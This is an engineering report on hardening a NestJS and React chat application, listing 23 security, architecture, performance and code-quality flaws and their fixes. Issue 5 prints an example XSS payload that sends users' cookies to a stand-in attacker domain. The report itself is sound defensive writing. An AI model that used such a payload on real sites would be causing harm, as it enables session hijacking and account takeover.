# Engineering Report — Production Hardening

This document lists every issue found in the original codebase, the risk it created, and
exactly how it was fixed. Written for a Senior-level code review panel.

---

## Security

### 1 — MD5 Password Hashing

| | |
|---|---|
| **File** | `backend/src/auth.service.ts` |
| **Problem** | Passwords were hashed with MD5 (`crypto.createHash('md5')`). MD5 is not a password-hashing function; it is a fast checksum. A modern GPU can compute 10 billion MD5 hashes per second, so any leaked database is cracked within hours using rainbow tables or brute force. |
| **Risk** | Full credential compromise of all users the moment the database is dumped. |
| **Fix** | Replaced with `bcrypt.hash(password, 12)` in `auth.service.ts`. bcrypt is intentionally slow (work factor 12 ≈ 250 ms per attempt), adaptive, and adds a built-in salt per hash. |
| **Principle** | OWASP Password Storage Cheat Sheet; bcrypt is the industry standard for this exact use case. |

---

### 2 — Hardcoded JWT Secret (Duplicated)

| | |
|---|---|
| **Files** | `auth.service.ts:8`, `chat.controller.ts:22` |
| **Problem** | `const JWT_SECRET = 'supersecret'` was hardcoded in source and committed to version control. It appeared twice, meaning changing it required a code change and redeploy. |
| **Risk** | Any person with read access to the repo (GitHub, CI logs) can forge valid JWT tokens and impersonate any user. |
| **Fix** | The secret is now read exclusively via `config.getOrThrow<string>('JWT_SECRET')` in `AuthService` and `JwtAuthGuard`. `ConfigModule` loads it from the environment. The `getOrThrow` variant crashes loudly at startup if the variable is missing, preventing silent misconfiguration in production. |
| **Principle** | 12-Factor App — Config; Secret management. |

---

### 3 — Password Hashes Exposed via Public API

| | |
|---|---|
| **File** | `app.controller.ts:38` |
| **Problem** | `GET /users` called `this.chatService['userRepository'].find()` directly (bypassing the service layer via bracket notation to access a private property) and returned the raw TypeORM entities including the `password` column. |
| **Risk** | Any authenticated — or in this app, even unauthenticated — client could retrieve all password hashes. Even MD5 hashes are attackable; bcrypt hashes should never be exposed. |
| **Fix** | The endpoint was removed entirely. The `UsersService.toPublicUser()` method explicitly destructs `password` out before returning data, providing a compile-time and runtime guarantee the field never leaks. |
| **Principle** | Principle of Least Privilege; Defense in Depth. |

---

### 4 — WebSocket Auth: Trusting Client-Supplied Identity

| | |
|---|---|
| **File** | `chat.gateway.ts:39` |
| **Problem** | `handleMessage` received `{ userId, senderName }` from the client payload and used those values to persist the message. Any client could send `userId: 1` and impersonate the admin. |
| **Risk** | Complete identity spoofing. Any user can post messages as any other user. |
| **Fix** | `handleConnection` now extracts the JWT from `client.handshake.auth.token`, verifies it with `AuthService.verifyToken`, and stores the decoded payload in `client.data.user`. All subsequent handlers read `client.data.user.userId` — a server-controlled value the client cannot influence. Connections with no valid token are immediately disconnected. |
| **Principle** | Never trust client-supplied identity; authenticate at the connection layer. |

---

### 5 — XSS via dangerouslySetInnerHTML

| | |
|---|---|
| **File** | `frontend/src/components/MessageItem.tsx:48` |
| **Problem** | Message content was rendered with `dangerouslySetInnerHTML={{ __html: message.content }}`. Any user who sends `<script>fetch('https://evil.com?c='+document.cookie)</script>` as a message executes arbitrary JavaScript in every other user's browser. |
| **Risk** | Session hijacking, credential theft, full account takeover for all chat participants. |
| **Fix** | Replaced with plain `{message.content}`. React escapes text content by default. No sanitization library is needed when you use the framework correctly. |
| **Principle** | OWASP XSS Prevention Cheat Sheet — Rule #1. |

---

### 6 — Wildcard CORS

| | |
|---|---|
| **File** | `main.ts:9` |
| **Problem** | `app.enableCors({ origin: '*' })` allows any domain to make credentialed requests to the API. |
| **Risk** | Opens the door to Cross-Site Request Forgery and data exfiltration from any malicious site. |
| **Fix** | Origin is now `process.env.FRONTEND_URL`, defaulting to `http://localhost:5173`. The same value is used on the WebSocket gateway. |

---

### 7 — No Global Validation Pipe

| | |
|---|---|
| **File** | `main.ts:11` (comment: "ValidationPipe intentionally not added") |
| **Problem** | DTOs existed (`CreateUserDto`, `SendMessageDto`) but were never wired up. Controllers accepted `body: any` with no validation. Arbitrary payloads could be passed to TypeORM, enabling mass-assignment or unexpected query behavior. |
| **Risk** | Input validation bypass; potential injection via unsanitized fields. |
| **Fix** | `ValidationPipe` added globally in `main.ts` with `whitelist: true` (strips undeclared fields) and `forbidNonWhitelisted: true` (returns 400 for unknown fields). Every controller now receives strongly-typed DTOs. |

---

### 8 — Silent Token Failure with Magic Default userId

| | |
|---|---|
| **File** | `chat.controller.ts:18–27` |
| **Problem** | If JWT verification failed, the code silently continued with `userId = 1`. This means failed authentication resulted in actions being attributed to user ID 1 (the first registered user). |
| **Risk** | Privilege escalation, unauthorized room creation attributed to another user. |
| **Fix** | `JwtAuthGuard` throws `UnauthorizedException` on any invalid token. There is no fallback default; the request is rejected. |

---

## Architecture

### 9 — Monolithic Module (No Feature Separation)

| | |
|---|---|
| **Problem** | All providers were registered in a single `AppModule`. Auth, chat, users, and gateway were all peers with no encapsulation. |
| **Risk** | Violates Single Responsibility Principle. Any module can import any other directly, making the dependency graph uncontrolled. Impossible to test or extract independently. |
| **Fix** | Split into `AuthModule`, `ChatModule`, `UsersModule`, each owning its own controllers, services, DTOs, and TypeORM feature registration. `AuthModule` exports `AuthService` so `ChatModule` can depend on it explicitly via NestJS's DI system. |

---

### 10 — Business Logic in Controllers

| | |
|---|---|
| **File** | `app.controller.ts:19–22` |
| **Problem** | Validation logic (`username.length < 3`) lived directly in the controller. |
| **Fix** | Moved to `RegisterDto` with `@MinLength(3)` enforced by the global `ValidationPipe`. Controllers are now pure routing delegates. |

---

### 11 — `synchronize: true` in Production

| | |
|---|---|
| **File** | `app.module.ts:22` |
| **Problem** | TypeORM's `synchronize: true` auto-alters the schema on every startup. This can silently drop columns containing production data if an entity is modified. |
| **Fix** | `synchronize` is now `config.get('NODE_ENV') !== 'production'`. Set `NODE_ENV=production` in the deployment environment. |

---

## Performance

### 12 — N+1 Query in getMessages

| | |
|---|---|
| **File** | `chat.service.ts:33–48` |
| **Problem** | For each message in a room, a separate `SELECT * FROM users WHERE id = ?` was issued. 100 messages = 101 queries. |
| **Risk** | At scale this saturates the database connection pool and causes visible latency spikes. |
| **Fix** | Replaced with a single `QueryBuilder` query using `innerJoinAndSelect('message.user', 'user')`. TypeORM joins the user in one SQL statement. |

---

### 13 — No Pagination on Message History

| | |
|---|---|
| **File** | `chat.controller.ts:32–35` |
| **Problem** | `getMessages` returned the entire messages table for a room with no limit. A room with 100,000 messages would return all of them in one response. |
| **Risk** | Memory exhaustion on both server and client; denial of service via large rooms. |
| **Fix** | Cursor-based pagination implemented via `GetMessagesDto` (`limit`, `cursor`). The query uses `WHERE id < :cursor ORDER BY id DESC LIMIT :limit`. Cursor-based pagination is preferred over offset-based because it is stable under concurrent inserts and scales to arbitrary dataset sizes. |

---

### 14 — Full Re-fetch on Every New WebSocket Message

| | |
|---|---|
| **File** | `ChatPage.tsx:57–63` |
| **Problem** | When a `newMessage` socket event arrived, the component called `fetchMessages(selectedRoom.id)` — an HTTP GET that returned all messages. One new message triggered a full round-trip to the server. |
| **Risk** | Under moderate load (e.g., 50 messages/min across 20 users), this generates hundreds of unnecessary HTTP requests. |
| **Fix** | The `newMessage` handler now does `setMessages(prev => [...prev, message])`. The message object is already in the socket payload; no HTTP request is needed. |

---

### 15 — WebSocket Reconnected on Every Render

| | |
|---|---|
| **File** | `App.tsx:18` |
| **Problem** | `const socket = io('http://localhost:3000')` was declared in the component body, creating a new connection on every render cycle. |
| **Risk** | Hundreds of orphaned WebSocket connections, server-side connection pool exhaustion. |
| **Fix** | The socket is created once inside a `useEffect` in `SocketContext`, stored in a `useRef`, and disconnected via the effect's cleanup function. |

---

### 16 — Inefficient Current User Lookup

| | |
|---|---|
| **File** | `ChatPage.tsx:69–79` |
| **Problem** | On mount, `fetchCurrentUser` called `GET /users` (which returned all users with their password hashes) then searched the array client-side to find the current user's username. |
| **Risk** | Fetches unbounded data; the endpoint also exposed passwords (see Issue 3). |
| **Fix** | The username is decoded directly from the JWT payload in the browser using `atob(token.split('.')[1])`. The JWT already contains `username` — no extra request needed. |

---

## Code Quality

### 17 — `any` Types Throughout

| | |
|---|---|
| **Problem** | Controllers used `body: any`, services returned `Promise<any[]>`, React components held `useState<any[]>`. TypeScript was present but not used. |
| **Fix** | All `any` replaced with concrete interfaces (`Room`, `Message`, `AuthUser`, `JwtPayload`, `MessageWithUser`, etc.). Service methods return typed interfaces. DTOs are typed end-to-end. |

---

### 18 — console.log in Production Code

| | |
|---|---|
| **Problem** | `console.log` calls in `auth.service.ts`, `chat.gateway.ts` and `ChatPage.tsx` would pollute production logs and could accidentally leak usernames or connection metadata to log aggregators. |
| **Fix** | All `console.log` removed. NestJS's built-in logger should be used for structured logging when needed. |

---

### 19 — Magic Strings / Numbers

| | |
|---|---|
| **Problem** | The room key prefix `'room_'` was copy-pasted three times in `chat.gateway.ts`. The connection status was encoded as `1` and `2` (magic numbers) in `Header.class.tsx`. |
| **Fix** | `ROOM_PREFIX` exported from `common/constants.ts` and used in one place. `Header` now receives `isConnected: boolean` and uses it directly — no internal status state needed. |

---

### 20 — React index as Key

| | |
|---|---|
| **File** | `ChatPage.tsx:233` |
| **Problem** | `key={index}` on message list items causes React to reuse the wrong DOM nodes when messages are prepended or reordered, producing incorrect rendering. |
| **Fix** | `key={msg.id}` — stable, unique, database-assigned. |

---

### 21 — Prop Drilling

| | |
|---|---|
| **Problem** | `token`, `socket`, and `apiUrl` were passed from `App` → `ChatPage` → `RoomList` → `MessageItem` even though `RoomList` and `MessageItem` never used them. |
| **Fix** | `AuthContext` provides `auth`. `SocketContext` provides the socket instance. Components consume context directly via `useAuth()` and `useSocket()`. `RoomList` and `MessageItem` props interfaces contain only what they actually use. |

---

### 22 — Class Component in Functional Codebase

| | |
|---|---|
| **File** | `Header.class.tsx` |
| **Problem** | The only class component in an otherwise fully-functional codebase. It held an internal `status: number` state with magic numbers (1 = disconnected, 2 = connected) and a `componentDidUpdate` to sync it from props — a pattern that exists only to work around the class lifecycle API. |
| **Fix** | Replaced with a functional component in `Header.tsx`. The `isConnected: boolean` prop is used directly with no internal state. |

---

### 23 — Missing useEffect Cleanup / Stale Closure

| | |
|---|---|
| **File** | `ChatPage.tsx:65–67` |
| **Problem** | The `socket.on('newMessage')` handler captured `selectedRoom` from the initial render (stale closure) because `selectedRoom` was missing from the dependency array. New messages would not appear if the user had switched rooms after mount. The handler was also never cleaned up, causing duplicate event handlers after hot reload. |
| **Fix** | A `selectedRoomRef` tracks the current room imperatively. The socket effect registers and deregisters named handler functions, with proper cleanup in the `return` callback. |

---

## Summary Table

| # | Category | Severity | Fix |
|---|---|---|---|
| 1 | Security | Critical | bcrypt replaces MD5 |
| 2 | Security | Critical | JWT secret from env via ConfigService |
| 3 | Security | Critical | Password endpoint removed; toPublicUser() strips field |
| 4 | Security | Critical | WS identity from server-verified JWT, not client payload |
| 5 | Security | Critical | dangerouslySetInnerHTML removed; plain text render |
| 6 | Security | High | CORS restricted to FRONTEND_URL env var |
| 7 | Security | High | Global ValidationPipe with whitelist |
| 8 | Security | High | JwtAuthGuard throws; no magic default userId |
| 9 | Architecture | High | AuthModule / ChatModule / UsersModule separation |
| 10 | Architecture | Medium | Validation in DTO, not controller |
| 11 | Architecture | High | synchronize disabled in production |
| 12 | Performance | High | N+1 fixed with QueryBuilder JOIN |
| 13 | Performance | High | Cursor-based pagination added |
| 14 | Performance | Medium | Append-on-receive; no re-fetch |
| 15 | Performance | High | Socket created once in SocketContext |
| 16 | Performance | Medium | Username from JWT payload; no extra request |
| 17 | Quality | Medium | All any types replaced with interfaces |
| 18 | Quality | Low | All console.log removed |
| 19 | Quality | Low | ROOM_PREFIX constant; boolean isConnected |
| 20 | Quality | Medium | key={msg.id} replaces key={index} |
| 21 | Quality | Medium | Context replaces prop drilling |
| 22 | Quality | Low | Class component replaced with function component |
| 23 | Quality | High | useEffect cleanup + selectedRoomRef for stable closure |
